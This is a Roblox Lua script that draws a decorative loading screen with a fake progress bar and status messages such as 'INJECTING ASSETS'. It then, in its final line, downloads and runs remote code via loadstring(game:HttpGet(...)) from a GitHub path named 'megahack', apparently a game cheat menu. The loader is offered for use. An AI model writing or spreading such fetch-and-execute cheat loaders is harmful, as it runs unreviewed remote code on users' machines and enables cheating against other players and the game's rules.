local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "VertelLoader"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

-- Background
local bg = Instance.new("Frame")
bg.Name = "Background"
bg.Size = UDim2.fromScale(1, 1)
bg.Position = UDim2.fromScale(0, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BorderSizePixel = 0
bg.ZIndex = 1
bg.Parent = screenGui

-- Grid lines (horizontal)
for i = 1, 20 do
	local line = Instance.new("Frame")
	line.Size = UDim2.new(1, 0, 0, 1)
	line.Position = UDim2.fromScale(0, i / 20)
	line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	line.BackgroundTransparency = 0.96
	line.BorderSizePixel = 0
	line.ZIndex = 2
	line.Parent = bg
end

-- Grid lines (vertical)
for i = 1, 30 do
	local line = Instance.new("Frame")
	line.Size = UDim2.new(0, 1, 1, 0)
	line.Position = UDim2.fromScale(i / 30, 0)
	line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	line.BackgroundTransparency = 0.96
	line.BorderSizePixel = 0
	line.ZIndex = 2
	line.Parent = bg
end

-- Radial glow center
local glow = Instance.new("ImageLabel")
glow.Size = UDim2.fromScale(0.8, 0.8)
glow.Position = UDim2.fromScale(0.1, 0.1)
glow.BackgroundTransparency = 1
glow.Image = "rbxassetid://6443323351"
glow.ImageColor3 = Color3.fromRGB(255, 255, 255)
glow.ImageTransparency = 0.92
glow.ZIndex = 2
glow.Parent = bg

-- Glass card
local card = Instance.new("Frame")
card.Name = "GlassCard"
card.Size = UDim2.fromScale(0.78, 0.76)
card.Position = UDim2.fromScale(0.11, 0.12)
card.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
card.BackgroundTransparency = 0.94
card.BorderSizePixel = 0
card.ZIndex = 3
card.Parent = bg

local cardCorner = Instance.new("UICorner")
cardCorner.CornerRadius = UDim.new(0, 20)
cardCorner.Parent = card

local cardStroke = Instance.new("UIStroke")
cardStroke.Color = Color3.fromRGB(255, 255, 255)
cardStroke.Transparency = 0.75
cardStroke.Thickness = 1
cardStroke.Parent = card

-- Top shine line on card
local shine = Instance.new("Frame")
shine.Size = UDim2.new(0.6, 0, 0, 1)
shine.Position = UDim2.fromScale(0.2, 0)
shine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
shine.BackgroundTransparency = 0.4
shine.BorderSizePixel = 0
shine.ZIndex = 4
shine.Parent = card

-- Corner accents
local function makeCorner(parent, xScale, yScale, borderT, borderR, borderB, borderL)
	local f = Instance.new("Frame")
	f.Size = UDim2.fromOffset(18, 18)
	f.Position = UDim2.fromScale(xScale, yScale)
	f.BackgroundTransparency = 1
	f.BorderSizePixel = 0
	f.ZIndex = 5
	f.Parent = parent

	if borderT then
		local t = Instance.new("Frame")
		t.Size = UDim2.new(1, 0, 0, 1)
		t.Position = UDim2.fromScale(0, 0)
		t.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		t.BackgroundTransparency = 0.4
		t.BorderSizePixel = 0
		t.ZIndex = 5
		t.Parent = f
	end
	if borderL then
		local l = Instance.new("Frame")
		l.Size = UDim2.new(0, 1, 1, 0)
		l.Position = UDim2.fromScale(0, 0)
		l.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		l.BackgroundTransparency = 0.4
		l.BorderSizePixel = 0
		l.ZIndex = 5
		l.Parent = f
	end
	if borderR then
		local r = Instance.new("Frame")
		r.Size = UDim2.new(0, 1, 1, 0)
		r.Position = UDim2.fromScale(1, 0)
		r.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		r.BackgroundTransparency = 0.4
		r.BorderSizePixel = 0
		r.ZIndex = 5
		r.Parent = f
	end
	if borderB then
		local b = Instance.new("Frame")
		b.Size = UDim2.new(1, 0, 0, 1)
		b.Position = UDim2.fromScale(0, 1)
		b.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		b.BackgroundTransparency = 0.4
		b.BorderSizePixel = 0
		b.ZIndex = 5
		b.Parent = f
	end
end

makeCorner(card, 0.03, 0.04, true, false, false, true)   -- top-left
makeCorner(card, 0.94, 0.04, true, true, false, false)   -- top-right
makeCorner(card, 0.03, 0.88, false, false, true, true)   -- bottom-left
makeCorner(card, 0.94, 0.88, false, true, true, false)   -- bottom-right

-- 3D Title Text (layered for depth effect)
local titleContainer = Instance.new("Frame")
titleContainer.Size = UDim2.new(1, 0, 0.42, 0)
titleContainer.Position = UDim2.fromScale(0, 0.08)
titleContainer.BackgroundTransparency = 1
titleContainer.ZIndex = 5
titleContainer.Parent = card

-- Shadow layers for 3D effect
local shadowColors = {
	{Color3.fromRGB(180,180,180), 0.0},
	{Color3.fromRGB(140,140,140), 0.0},
	{Color3.fromRGB(100,100,100), 0.0},
	{Color3.fromRGB(60,60,60),   0.0},
	{Color3.fromRGB(30,30,30),   0.0},
}

for i, data in ipairs(shadowColors) do
	local shadow = Instance.new("TextLabel")
	shadow.Size = UDim2.fromScale(1, 1)
	shadow.Position = UDim2.fromOffset(i * 2, i * 2)
	shadow.BackgroundTransparency = 1
	shadow.Text = "VERTELVSEPOEL"
	shadow.TextColor3 = data[1]
	shadow.TextTransparency = data[2]
	shadow.Font = Enum.Font.GothamBold
	shadow.TextScaled = true
	shadow.ZIndex = 5 + i
	shadow.Parent = titleContainer
end

-- Main title
local title = Instance.new("TextLabel")
title.Size = UDim2.fromScale(1, 1)
title.Position = UDim2.fromScale(0, 0)
title.BackgroundTransparency = 1
title.Text = "VERTELVSEPOEL"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextScaled = true
title.ZIndex = 12
title.Parent = titleContainer

-- Divider line
local divider = Instance.new("Frame")
divider.Size = UDim2.new(0.75, 0, 0, 1)
divider.Position = UDim2.fromScale(0.125, 0.54)
divider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
divider.BackgroundTransparency = 0.65
divider.BorderSizePixel = 0
divider.ZIndex = 6
divider.Parent = card

-- Loading label
local loadingLabel = Instance.new("TextLabel")
loadingLabel.Size = UDim2.new(0.75, 0, 0.07, 0)
loadingLabel.Position = UDim2.fromScale(0.125, 0.57)
loadingLabel.BackgroundTransparency = 1
loadingLabel.Text = "INITIALIZING SYSTEM..."
loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingLabel.TextTransparency = 0.6
loadingLabel.Font = Enum.Font.GothamBold
loadingLabel.TextScaled = true
loadingLabel.ZIndex = 6
loadingLabel.Parent = card

-- Progress bar track
local barTrack = Instance.new("Frame")
barTrack.Size = UDim2.new(0.75, 0, 0.045, 0)
barTrack.Position = UDim2.fromScale(0.125, 0.66)
barTrack.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
barTrack.BackgroundTransparency = 0.9
barTrack.BorderSizePixel = 0
barTrack.ZIndex = 6
barTrack.Parent = card

local barTrackCorner = Instance.new("UICorner")
barTrackCorner.CornerRadius = UDim.new(1, 0)
barTrackCorner.Parent = barTrack

local barTrackStroke = Instance.new("UIStroke")
barTrackStroke.Color = Color3.fromRGB(255, 255, 255)
barTrackStroke.Transparency = 0.85
barTrackStroke.Thickness = 1
barTrackStroke.Parent = barTrack

-- Progress bar fill
local barFill = Instance.new("Frame")
barFill.Size = UDim2.fromScale(0, 1)
barFill.Position = UDim2.fromScale(0, 0)
barFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
barFill.BorderSizePixel = 0
barFill.ZIndex = 7
barFill.Parent = barTrack

local barFillCorner = Instance.new("UICorner")
barFillCorner.CornerRadius = UDim.new(1, 0)
barFillCorner.Parent = barFill

-- Status text (left)
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0.5, 0, 0.08, 0)
statusLabel.Position = UDim2.fromScale(0.125, 0.74)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "● LOADING MODULES"
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.TextTransparency = 0.55
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextScaled = true
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.ZIndex = 6
statusLabel.Parent = card

-- Percent display (right)
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(0.2, 0, 0.14, 0)
percentLabel.Position = UDim2.fromScale(0.69, 0.70)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextScaled = true
percentLabel.TextXAlignment = Enum.TextXAlignment.Right
percentLabel.ZIndex = 6
percentLabel.Parent = card

-- Messages
local messages = {
	{at = 0,   label = "INITIALIZING SYSTEM...",   status = "● BOOT SEQUENCE"},
	{at = 12,  label = "LOADING CORE MODULES...",   status = "● CORE MODULES"},
	{at = 28,  label = "INJECTING ASSETS...",        status = "● ASSET PIPELINE"},
	{at = 44,  label = "COMPILING SHADERS...",       status = "● GPU SHADERS"},
	{at = 58,  label = "SYNCING NETWORK LAYER...",   status = "● NETWORK SYNC"},
	{at = 72,  label = "APPLYING PATCHES...",        status = "● PATCH INJECTION"},
	{at = 85,  label = "FINALIZING ENVIRONMENT...", status = "● ENVIRONMENT"},
	{at = 96,  label = "ALMOST READY...",            status = "● FINAL CHECKS"},
	{at = 100, label = "SYSTEM ONLINE.",             status = "● ONLINE"},
}

local function getMessageForProgress(p)
	local result = messages[1]
	for _, m in ipairs(messages) do
		if p >= m.at then result = m end
	end
	return result
end

-- Float animation for title
local floatUp = true
local floatOffset = 0
local FLOAT_SPEED = 3
local FLOAT_RANGE = 5

-- Pulse the bar glow
local glowPulse = true
task.spawn(function()
	while screenGui.Parent do
		TweenService:Create(barFill, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
			BackgroundTransparency = 0.1
		}):Play()
		task.wait(0.8)
		TweenService:Create(barFill, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
			BackgroundTransparency = 0.45
		}):Play()
		task.wait(0.8)
	end
end)

-- Floating title animation
task.spawn(function()
	local t = 0
	while screenGui.Parent do
		t += task.wait()
		local offset = math.sin(t * FLOAT_SPEED) * FLOAT_RANGE
		titleContainer.Position = UDim2.new(0, 0, 0.08, offset)
	end
end)

-- Main progress loop (10 seconds)
local DURATION = 10
local elapsed = 0
local progress = 0

local connection
connection = RunService.Heartbeat:Connect(function(dt)
	elapsed = math.min(elapsed + dt, DURATION)
	progress = (elapsed / DURATION) * 100

	local rounded = math.floor(progress)
	barFill.Size = UDim2.fromScale(progress / 100, 1)
	percentLabel.Text = rounded .. "%"

	local msg = getMessageForProgress(rounded)
	loadingLabel.Text = msg.label
	statusLabel.Text = msg.status

	if elapsed >= DURATION then
		connection:Disconnect()
		percentLabel.Text = "100%"
		barFill.Size = UDim2.fromScale(1, 1)
		loadingLabel.Text = "SYSTEM ONLINE."
		statusLabel.Text = "● ONLINE"

		-- Flash and fade out
		task.wait(0.3)
		local flashFrame = Instance.new("Frame")
		flashFrame.Size = UDim2.fromScale(1, 1)
		flashFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		flashFrame.BackgroundTransparency = 0.3
		flashFrame.BorderSizePixel = 0
		flashFrame.ZIndex = 20
		flashFrame.Parent = card

		TweenService:Create(flashFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
			BackgroundTransparency = 1
		}):Play()

		task.wait(1.2)

		-- Fade out entire GUI
		TweenService:Create(bg, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
			BackgroundTransparency = 1
		}):Play()
		TweenService:Create(card, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
			BackgroundTransparency = 1
		}):Play()

		task.wait(1)
		screenGui:Destroy()

		-- Run the actual script
		loadstring(game:HttpGet("https://raw.githubusercontent.com/shaypishgithub/infinity/refs/heads/main/vertelvsepoel/megahack/maybemenu.lua", true))()
	end
end)
